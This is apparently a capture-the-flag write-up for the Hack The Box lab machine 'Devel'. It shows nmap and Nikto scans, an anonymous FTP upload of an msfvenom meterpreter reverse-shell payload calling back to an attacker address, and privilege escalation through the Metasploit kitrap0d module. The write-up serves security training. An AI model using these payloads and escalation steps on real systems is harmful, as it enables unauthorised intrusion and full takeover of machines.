# Devel

## Information Gathering
Devel<br>
10.10.10.5<br>

Software Versions
- Microsoft IIS httpd 7.5

## Enumeration
Of course start with an nmap scan:
```bash
# Nmap 7.92 scan initiated Mon Feb 21 17:04:11 2022 as: nmap -sC -sV -oN nmap/devel.nmap 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.028s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
| 02-21-22  03:26PM                 2932 rs1.aspx
| 02-21-22  03:52PM                38392 shell.asp
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 21 17:04:24 2022 -- 1 IP address (1 host up) scanned in 13.40 seconds

```
I also run a Nikto scan:
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.5
+ Target Port: 80
+ GET Retrieved x-powered-by header: ASP.NET
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Retrieved x-aspnet-version header: 2.0.50727
+ OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ GET /: Appears to be a default IIS 7 install.

```
And a Gobuster scan but nothing comes up.

## Exploitation
Right off the bat, we see anonymous login for ftp. Inside the ftp server, whatever we upload can be served on the HTTP server. I create a simple payload using msfvenom and upload it to the webserver.
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.122 lport=1337 -f aspx -o shell.aspx./
```
I start up a listener on Metasploit and catch a shell.

## Privilege Escalation
Standard Windows privilege escalation. Load the local_exploit_suggester and get the below.
```
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 40 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. -
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
<b>exploit/windows/local/ms10_015_kitrap0d</b> returns an Administrator shell.